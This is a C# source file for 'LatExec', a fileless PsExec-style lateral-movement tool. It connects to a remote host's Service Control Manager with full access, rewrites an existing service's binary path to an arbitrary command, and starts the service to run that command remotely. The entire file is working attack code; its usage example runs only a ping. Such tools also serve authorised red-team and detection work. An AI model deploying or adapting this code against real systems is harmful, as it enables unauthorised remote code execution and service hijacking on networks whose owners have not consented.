using System;
using System.Runtime.InteropServices;

namespace latexec
{
    // Fileless PsExec, works on Win10 and Win2019
    class Program
    {
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        static void Main(string[] args)
        {
            if (args.Length != 3)
            {
                Console.WriteLine("Run as:");
                Console.WriteLine(".\\LatExec.exe HOST SERVICE COMMAND");
                Console.WriteLine("");
                Console.WriteLine("Example:");
                Console.WriteLine(".\\LatExec.exe appserv01 SensorService \"ping.exe 127.0.0.1\"");
                Console.WriteLine("");
                return;
            }

            String target = args[0];

            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);

            string ServiceName = args[1];
            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);

            string payload = args[2];
            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);

            bResult = StartService(schService, 0, null);
        }
    }
}